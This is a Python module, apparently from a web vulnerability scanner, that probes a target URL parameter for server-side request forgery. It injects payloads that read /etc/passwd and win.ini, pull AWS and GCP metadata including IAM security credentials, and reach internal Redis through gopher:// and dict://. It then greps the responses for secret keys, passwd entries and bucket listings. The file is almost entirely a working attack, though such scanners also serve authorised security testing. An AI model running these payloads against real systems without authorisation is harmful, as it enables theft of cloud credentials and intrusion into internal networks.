import re
from typing import Optional
import requests

SSRF_EVIDENCE_PATTERNS = [
    r"root:.*:0:0:",
    r"root:[^:]+:\d+:\d+",
    r"uid=\d+\([\w]+\)",
    r"gid=\d+\([\w]+\)",
    r"\[root\].*#!/bin/bash",
    r"bin/(bash|sh)",
    r"ami-[a-z0-9]{17}",
    r"ami-id",
    r"instance-id",
    r"instance-type",
    r"local-hostname",
    r"local-ipv4",
    r"public-hostname",
    r"public-ipv4",
    r"security-credentials",
    r"iam/security-credentials",
    r"AWS_SECRET_ACCESS_KEY",
    r"AWS_ACCESS_KEY_ID",
    r"MetaData",
    r"user-data",
    r"secret-key",
    r"access-key",
    r"<html><head><title>Bucket: ",
    r"ListBucketResult",
    r"<Name>",
    r"<Contents>",
    r"<Key>",
]

SSRF_URLS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/",
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_info",
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None}

    for ssrf_url in SSRF_URLS:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, ssrf_url),
                         timeout=timeout, verify=False)
            for pat in SSRF_EVIDENCE_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "disclosure"
                    result["evidence"].append("ssrf: %s => <%s>" % (ssrf_url[:30], pat[:20]))
                    result["payload"] = ssrf_url
                    break
        except:
            pass
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        internal_urls = [
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:80/",
            "http://localhost/",
        ]
        for ssrf_url in internal_urls:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, ssrf_url),
                             timeout=timeout, verify=False)
                if r.status_code not in (404, 502, 503) and len(r.text) > 100:
                    result["vulnerable"] = True
                    result["type"] = "internal_reachable"
                    result["evidence"].append("ssrf: %s => %d bytes" % (ssrf_url[:20], len(r.text)))
                    result["payload"] = ssrf_url
                    break
            except:
                pass

    return result
